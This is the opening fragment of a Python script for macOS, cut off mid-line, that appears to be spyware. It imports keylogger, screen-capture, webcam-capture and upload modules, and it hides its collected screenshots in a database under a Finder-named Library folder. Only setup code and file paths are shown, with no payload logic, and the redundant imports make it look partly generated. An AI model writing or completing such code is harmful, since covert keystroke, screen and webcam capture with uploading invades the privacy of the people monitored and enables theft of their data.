import ctypes
import ctypes.util
import threading
import sqlite3
import os
import time
import sys

# OS X specific
from Foundation import NSBundle
from AppKit import NSScreen, NSWorkspace
import objc

# Get the path to the bundle
bundle = NSBundle.mainBundle()
path = bundle.bundlePath() + '/Contents/Resources/lib/'

# Add the path to the system path
sys.path.append(path)

# Import the libraries
import keylogger
import screen_capture
import screen_capture_osx
import screenshot
import screenshot_osx
import webcam_capture
import webcam_capture_osx
import upload
import upload_osx

# Get the path to the database
db_path = os.path.expanduser('~/Library/Application Support/Finder/')
db_file = db_path + 'Screenshot.db'

# Get the path to the screenshot directory
screenshot_path = os.path.expanduser('~/Desktop/')

# Get the path to the webcam directory
webcam_path = os.path.expanduser('~
